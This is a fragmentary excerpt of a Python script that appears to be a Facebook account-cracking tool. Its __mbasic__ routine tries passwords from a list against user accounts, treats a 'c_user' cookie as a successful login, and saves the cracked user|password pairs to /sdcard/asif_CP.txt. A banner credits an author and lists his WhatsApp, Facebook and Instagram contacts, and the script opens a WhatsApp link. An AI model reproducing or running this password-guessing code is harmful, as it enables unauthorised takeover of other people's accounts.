...
def main_apv():
    ...
    try:
        ...
        print ("[*]｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡")
        time.sleep(6)
        os.system("xdg-open https://wa.me/+923078271366")
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;32m[ASIF-SUCCESSFUL] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				...
				try:
					...
					cp.append(wrt)
					open('/sdcard/asif_CP.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = ''
					...
					pass
				print('\r\033[1;91m[ASIF-CHECKPOINT] %s | %s%s      ' % (user,pw,tahun(user)))
...
╚═╝░░╚═╝╚═════╝░╚═╝╚═╝░░░░░
\033[1;37m ｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡
\033[1;94m ⇨AUTHOR       : ASIF AFRIDI
\033[1;95m ⇨WHATSAPP  : +923078271366
\033[1;96m ⇨FACEBOOK   : ASIFOOO.JANI
\033[1;93m ⇨INSTA.           : muha.mmadasif455
